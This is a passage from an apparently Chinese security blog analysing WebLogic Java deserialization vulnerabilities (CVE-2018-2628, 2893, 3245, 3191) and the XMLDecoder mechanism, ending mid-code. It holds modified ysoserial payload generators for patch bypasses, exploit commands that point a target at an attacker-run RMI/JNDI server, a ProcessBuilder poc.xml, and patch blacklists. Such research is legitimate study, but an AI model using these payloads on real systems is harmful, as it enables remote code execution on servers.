<h3 id="CVE-2018-2628"><a href="#CVE-2018-2628" class="headerlink" title="CVE-2018-2628"></a>CVE-2018-2628</h3><p>可以看到在cve-2017-3248中的补丁中，在resolveProxyClass方法中对<code>java.rmi.registry.Registry</code>进行了过滤。<br>在readObject底层操作中，存在两条路，一条是resolveClass，另一条是resolveProxyClass。当反序列化的是动态代理对象，就会走到resolveProxyClass方法中，如果取消Proxy的包装，就能够绕过resolveProxyClass方法<br><strong>绕过分析</strong><br>两种利用方式<br>第一：去除Proxy，修改payloads.JRMPClient生成payload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Registry <span class="title function_">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    String host;</span><br><span class="line">    <span class="type">int</span> port;</span><br><span class="line">    <span class="type">int</span> <span class="variable">sep</span> <span class="operator">=</span> command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">        port = <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">65535</span>);</span><br><span class="line">        host = command;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">        port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">    <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">    <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line">    <span class="comment">// 删除下面</span></span><br><span class="line">    <span class="comment">// RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);</span></span><br><span class="line">    <span class="comment">// Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[] &#123;</span></span><br><span class="line">    <span class="comment">//     Registry.class</span></span><br><span class="line">    <span class="comment">// &#125;, obj);</span></span><br><span class="line">    <span class="comment">// return proxy;</span></span><br><span class="line">    <span class="comment">// 直接返回UnicastRef对象</span></span><br><span class="line">    <span class="keyword">return</span> ref;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修改后打成jar包，然后按照cve-2017-3248的步骤即可利用<br>第二：使用java.rmi.activation.Activator远程接口<br>还是修改payloads.JRMPClient</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Registry <span class="title function_">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    String host;</span><br><span class="line">    <span class="type">int</span> port;</span><br><span class="line">    <span class="type">int</span> <span class="variable">sep</span> <span class="operator">=</span> command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">        port = <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">65535</span>);</span><br><span class="line">        host = command;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">        port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">    <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">    <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line">    <span class="type">Activator</span> <span class="variable">proxy</span> <span class="operator">=</span> (Activator) Proxy.newProxyInstance(JRMPClient2.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">            Activator.class</span><br><span class="line">        &#125;, obj);</span><br><span class="line">    <span class="keyword">return</span> proxy;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>修复</strong>：<br>2018年发布的p27395085_1036_Generic<br>其补丁对<code>sun.rmi.server.UnicastRef</code>进行了过滤，具体位置在weblogic.utils.io.oif.WebLogicFilterConfig</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] DEFAULT_BLACKLIST_CLASSES = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;org.codehaus.groovy.runtime.ConvertedClosure&quot;</span>, <span class="string">&quot;org.codehaus.groovy.runtime.ConversionHandler&quot;</span>, <span class="string">&quot;org.codehaus.groovy.runtime.MethodClosure&quot;</span>, <span class="string">&quot;org.springframework.transaction.support.AbstractPlatformTransactionManager&quot;</span>, <span class="string">&quot;sun.rmi.server.UnicastRef&quot;</span>&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="CVE-2018-2893"><a href="#CVE-2018-2893" class="headerlink" title="CVE-2018-2893"></a>CVE-2018-2893</h3><p>由于在CVE-2018-2628的补丁后，对<code>sun.rmi.server.UnicastRef</code>进行了过滤，所以这里的绕过方式就是CVE-2016-0638与CVE-2017-3248的结合<br>修改payloads.JRMPClient<br>由于JDK中不存在StreamMessageImpl类，所以需要导入weblogic中的类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> weblogic.jms.common.StreamMessageImpl;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span> <span class="params">(<span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    String host;</span><br><span class="line">    <span class="type">int</span> port;</span><br><span class="line">    <span class="type">int</span> <span class="variable">sep</span> <span class="operator">=</span> command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (sep &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        port = <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">65535</span>);</span><br><span class="line">        host = command;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">        port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ObjID</span> <span class="variable">objID</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt());</span><br><span class="line">    <span class="type">TCPEndpoint</span> <span class="variable">tcpEndpoint</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">    <span class="type">UnicastRef</span> <span class="variable">unicastRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(objID, tcpEndpoint, <span class="literal">false</span>));</span><br><span class="line">    <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">remoteObjectInvocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(unicastRef);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Registry.class &#125;, remoteObjectInvocationHandler);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> streamMessageImpl(Serializer.serialize(object));</span><br><span class="line">    <span class="comment">// or</span></span><br><span class="line">    <span class="comment">// StreamMessageImpl streamMessage = new StreamMessageImpl();</span></span><br><span class="line">    <span class="comment">// byte[] serialize = Serializer.serialize(object);</span></span><br><span class="line">    <span class="comment">// streamMessage.setDataBuffer(serialize,serialize.length);</span></span><br><span class="line">    <span class="comment">// return streamMessage;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>修复</strong>：<br>18年7月的p27919965_1036_Generic补丁</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] DEFAULT_BLACKLIST_PACKAGES = </span><br><span class="line">&#123; <span class="string">&quot;org.apache.commons.collections.functors&quot;</span>,</span><br><span class="line"> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax&quot;</span>,</span><br><span class="line"> <span class="string">&quot;javassist&quot;</span>, <span class="string">&quot;java.rmi.activation&quot;</span>, </span><br><span class="line"> <span class="string">&quot;sun.rmi.server&quot;</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] DEFAULT_BLACKLIST_CLASSES = </span><br><span class="line">&#123; <span class="string">&quot;org.codehaus.groovy.runtime.ConvertedClosure&quot;</span>,</span><br><span class="line"><span class="string">&quot;org.codehaus.groovy.runtime.ConversionHandler&quot;</span>,</span><br><span class="line"><span class="string">&quot;org.codehaus.groovy.runtime.MethodClosure&quot;</span>, <span class="string">&quot;org.springframework.transaction.support.AbstractPlatformTransactionManager&quot;</span>, <span class="string">&quot;java.rmi.server.UnicastRemoteObject&quot;</span>, </span><br><span class="line"><span class="string">&quot;java.rmi.server.RemoteObjectInvocationHandler&quot;</span> &#125;;</span><br></pre></td></tr></table></figure>

<p>对<code>java.rmi.activation.*</code>、<code>sun.rmi.server.*</code>、<code>java.rmi.server.RemoteObjectInvocationHandler</code>、<code>java.rmi.server.UnicastRemoteObject</code>进行了过滤</p>
<h3 id="CVE-2018-3245"><a href="#CVE-2018-3245" class="headerlink" title="CVE-2018-3245"></a>CVE-2018-3245</h3><p>这里过滤了RemoteObjectInvocationHandler和UnicastRemoteObject，需要重新找到一个替代类，但是总体的思想没有变<br>观察CVE-2017-3248中的函数调用栈，会调用RemoteObject的readObject方法，所以这里只需要找到继承<code>java.rmi.server.RemoteObject</code>的类就行<br>查看RemoteObject的子类：<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230812224636.png"><br>可利用的类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javax.management.remote.rmi.RMIConnectionImpl_Stub</span><br><span class="line">com.sun.jndi.rmi.registry.ReferenceWrapper_Stub</span><br><span class="line">javax.management.remote.rmi.RMIServerImpl_Stub</span><br><span class="line">sun.rmi.registry.RegistryImpl_Stub</span><br><span class="line">sun.rmi.transport.DGCImpl_Stub</span><br><span class="line">sun.management.jmxremote.SingleEntryRegistry</span><br></pre></td></tr></table></figure>

<p>继续修改payloads.JRMPClient</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnectionImpl_Stub;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span> <span class="params">(<span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    String host;</span><br><span class="line">    <span class="type">int</span> port;</span><br><span class="line">    <span class="type">int</span> <span class="variable">sep</span> <span class="operator">=</span> command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (sep &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        port = <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">65535</span>);</span><br><span class="line">        host = command;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">        port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ObjID</span> <span class="variable">objID</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt());</span><br><span class="line">    <span class="type">TCPEndpoint</span> <span class="variable">tcpEndpoint</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">    <span class="type">UnicastRef</span> <span class="variable">unicastRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(objID, tcpEndpoint, <span class="literal">false</span>));</span><br><span class="line">    <span class="type">RMIConnectionImpl_Stub</span> <span class="variable">stub</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnectionImpl_Stub</span>(ref);</span><br><span class="line">    <span class="keyword">return</span> stub;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>修复</strong><br>2018年8月发布的p28343311_1036_201808Generic补丁<br>它将java.rmi.server.RemoteObject加入到黑名单，使用网上一张图<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230812225346.png"></p>
<h3 id="CVE-2018-3191"><a href="#CVE-2018-3191" class="headerlink" title="CVE-2018-3191"></a>CVE-2018-3191</h3><p>这个漏洞是T3+JNDI<br><strong>漏洞复现</strong>：<br>直接下载这个利用工具<a href="https://github.com/m00zh33/CVE-2018-3191">https://github.com/m00zh33/CVE-2018-3191</a><br>然后配合JNDI利用工具<a href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a><br>python脚本依然使用cve-2017-3248的脚本，修改一些参数即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="string">&quot;touch /tmp/cve-2018-3191&quot;</span> -A <span class="string">&quot;192.168.155.90&quot;</span></span><br><span class="line">python cve-2018-3191.py 127.0.0.1 7001 weblogic-spring-jndi-10.3.6.0.jar rmi://192.168.155.90:1099/ushw72</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230813154112.png"><br><strong>漏洞分析</strong>：<br>在JndiTemplate类的lookup处下断点，开启调试<br>函数调用栈：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">lookup:<span class="number">155</span>, JndiTemplate (com.bea.core.repackaged.springframework.jndi)</span><br><span class="line">lookupUserTransaction:<span class="number">565</span>, JtaTransactionManager (com.bea.core.repackaged.springframework.transaction.jta)</span><br><span class="line">initUserTransactionAndTransactionManager:<span class="number">444</span>, JtaTransactionManager (com.bea.core.repackaged.springframework.transaction.jta)</span><br><span class="line">readObject:<span class="number">1198</span>, JtaTransactionManager (com.bea.core.repackaged.springframework.transaction.jta)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">57</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">601</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1004</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1891</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1796</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1348</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">370</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">69</span>, InboundMsgAbbrev (weblogic.rjvm)</span><br><span class="line">read:<span class="number">41</span>, InboundMsgAbbrev (weblogic.rjvm)</span><br><span class="line">readMsgAbbrevs:<span class="number">283</span>, MsgAbbrevJVMConnection (weblogic.rjvm)</span><br><span class="line">init:<span class="number">215</span>, MsgAbbrevInputStream (weblogic.rjvm)</span><br><span class="line">dispatch:<span class="number">498</span>, MsgAbbrevJVMConnection (weblogic.rjvm)</span><br><span class="line">dispatch:<span class="number">330</span>, MuxableSocketT3 (weblogic.rjvm.t3)</span><br><span class="line">dispatch:<span class="number">394</span>, BaseAbstractMuxableSocket (weblogic.socket)</span><br><span class="line">readReadySocketOnce:<span class="number">960</span>, SocketMuxer (weblogic.socket)</span><br><span class="line">readReadySocket:<span class="number">897</span>, SocketMuxer (weblogic.socket)</span><br><span class="line">processSockets:<span class="number">130</span>, PosixSocketMuxer (weblogic.socket)</span><br><span class="line">run:<span class="number">29</span>, SocketReaderRequest (weblogic.socket)</span><br><span class="line">execute:<span class="number">42</span>, SocketReaderRequest (weblogic.socket)</span><br><span class="line">execute:<span class="number">145</span>, ExecuteThread (weblogic.kernel)</span><br><span class="line">run:<span class="number">117</span>, ExecuteThread (weblogic.kernel)</span><br></pre></td></tr></table></figure>

<p>前面这些步骤不需要管，这条链就4个步骤<br>观察initUserTransactionAndTransactionManager方法，userTransactionName是我们设置的rmi地址<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230813162555.png"><br>最后通过lookup函数查询rmi<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230813162741.png"><br>根据以上分析，也可以通过修改ysoserial来获得payload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// if(command == null) &#123;</span></span><br><span class="line">    <span class="comment">//     command = &quot;rmi://localhost:1099/Exploit&quot;;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="type">JtaTransactionManager</span> <span class="variable">jtaTransactionManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JtaTransactionManager</span>();</span><br><span class="line">    jtaTransactionManager.setUserTransactionName(command);</span><br><span class="line">    <span class="keyword">return</span> jtaTransactionManager;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>修复</strong>：<br>2018年8月发布p28343311_1036_Generic补丁，它将JtaTransactionManager的父类AbstractPlatformTransactionManager加入到了黑名单<br>复制网上一张图<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230813163136.png"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://er1cccc.gitee.io/r2/2021/11/04/weblogic%E5%8F%A4%E8%80%81%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/">weblogic古老漏洞梳理 | r2’s blog (gitee.io)</a><br><a href="http://drops.xmd5.com/static/drops/web-13470.html">修复weblogic的JAVA反序列化漏洞的多种方法 | WooYun知识库 (xmd5.com)</a><br><a href="https://www.freebuf.com/vuls/229140.html">从防护角度看Weblogic反序列化历史漏洞 - FreeBuf网络安全行业门户</a><br><a href="https://xz.aliyun.com/t/9932">weblogic漏洞大杂烩</a></p>
<h2 id="基于XML"><a href="#基于XML" class="headerlink" title="基于XML"></a>基于XML</h2><h3 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h3><p><strong>XMLDecoder</strong>：<br>官方文档解释</p>
<blockquote>
<p>The XMLDecoder class is used to read XML documents created using the XMLEncoder and is used just like the ObjectInputStream.</p>
</blockquote>
<p>package: java.beans<br>example:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">XMLDecoder</span> <span class="variable">d</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XMLDecoder</span>(</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;Test.xml&quot;</span>)));</span><br><span class="line"><span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> d.readObject();</span><br><span class="line">d.close();</span><br></pre></td></tr></table></figure>

<p>Constructor and Method:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">XMLDecoder(InputSource is)</span><br><span class="line"><span class="comment">//Creates a new decoder to parse XML archives created by the XMLEncoder class.</span></span><br><span class="line"></span><br><span class="line">XMLDecoder(InputStream in)</span><br><span class="line"><span class="comment">//Creates a new input stream for reading archives created by the XMLEncoder class.</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">Object <span class="title function_">readObject</span><span class="params">()</span></span><br><span class="line"><span class="comment">//Reads the next object from the underlying input stream.</span></span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure>

<p><strong>XMLEncoder</strong>:<br>官方文档解释</p>
<blockquote>
<p>The XMLEncoder class is a complementary alternative to the ObjectOutputStream and can used to generate a textual representation of a JavaBean in the same way that the ObjectOutputStream can be used to create binary representation of Serializable objects.</p>
</blockquote>
<p>example:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">XMLEncoder</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XMLEncoder</span>(</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;Test.xml&quot;</span>)));</span><br><span class="line">e.writeObject(<span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">&quot;Hello, world&quot;</span>));</span><br><span class="line">e.close();</span><br></pre></td></tr></table></figure>

<p>Constructor and Method:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">XMLEncoder(OutputStream out)</span><br><span class="line"><span class="comment">//Creates a new XML encoder to write out JavaBeans to the stream out using an XML encoding.</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(Object o)</span></span><br><span class="line"><span class="comment">//Write an XML representation of the specified object to the output.</span></span><br></pre></td></tr></table></figure>

<h3 id="XMLDecoder反序列化测试"><a href="#XMLDecoder反序列化测试" class="headerlink" title="XMLDecoder反序列化测试"></a>XMLDecoder反序列化测试</h3><p>测试类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> XmlDecoder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.beans.XMLDecoder;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XmlDecoderTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException &#123;</span><br><span class="line">        <span class="type">XMLDecoder</span> <span class="variable">xmlDecoder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XMLDecoder</span>(<span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;C:\\code\\javacode\\java-sec\\src\\main\\java\\XmlDecoder\\poc.xml&quot;</span>)));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> xmlDecoder.readObject();</span><br><span class="line">        xmlDecoder.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试poc.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.4.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>cmd<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>/C<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>命令执行成功<br><strong>流程分析</strong>：<br>关键函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">scanDocument</span><span class="params">(<span class="type">boolean</span> complete)</span></span><br><span class="line"><span class="keyword">throws</span> IOException, XNIException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// keep dispatching &quot;events&quot;</span></span><br><span class="line">    fEntityManager.setEntityHandler(<span class="built_in">this</span>);</span><br><span class="line">    <span class="comment">//System.out.println(&quot; get Document Handler in NSDocumentHandler &quot; + fDocumentHandler );</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="variable">event</span> <span class="operator">=</span> next();</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">switch</span> (event) &#123;</span><br><span class="line">            <span class="comment">// 7</span></span><br><span class="line">            <span class="keyword">case</span> XMLStreamConstants.START_DOCUMENT :</span><br><span class="line">                <span class="comment">//fDocumentHandler.startDocument(fEntityManager.getEntityScanner(),fEntityManager.getEntityScanner().getVersion(),fNamespaceContext,null);// not able to get</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">// 1</span></span><br><span class="line">            <span class="keyword">case</span> XMLStreamConstants.START_ELEMENT :</span><br><span class="line">                <span class="comment">//System.out.println(&quot; in scann element&quot;);</span></span><br><span class="line">                <span class="comment">//fDocumentHandler.startElement(getElementQName(),fAttributes,null);</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">// 4</span></span><br><span class="line">            <span class="keyword">case</span> XMLStreamConstants.CHARACTERS :</span><br><span class="line">                fDocumentHandler.characters(getCharacterData(),<span class="literal">null</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> XMLStreamConstants.SPACE:</span><br><span class="line">                <span class="comment">//check if getCharacterData() is the right function to retrieve ignorableWhitespace information.</span></span><br><span class="line">                <span class="comment">//System.out.println(&quot;in the space&quot;);</span></span><br><span class="line">                <span class="comment">//fDocumentHandler.ignorableWhitespace(getCharacterData(), null);</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> XMLStreamConstants.ENTITY_REFERENCE :</span><br><span class="line">                <span class="comment">//entity reference callback are given in startEntity</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> XMLStreamConstants.PROCESSING_INSTRUCTION :</span><br><span class="line">                fDocumentHandler.processingInstruction(getPITarget(),getPIData(),<span class="literal">null</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> XMLStreamConstants.COMMENT :</span><br><span class="line">                <span class="comment">//System.out.println(&quot; in COMMENT of the XMLNSDocumentScannerImpl&quot;);</span></span><br><span class="line">                fDocumentHandler.comment(getCharacterData(),<span class="literal">null</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> XMLStreamConstants.DTD :</span><br><span class="line">                <span class="comment">//all DTD related callbacks are handled in DTDScanner.</span></span><br><span class="line">                <span class="comment">//1. Stax doesn&#x27;t define DTD states as it does for XML Document.</span></span><br><span class="line">      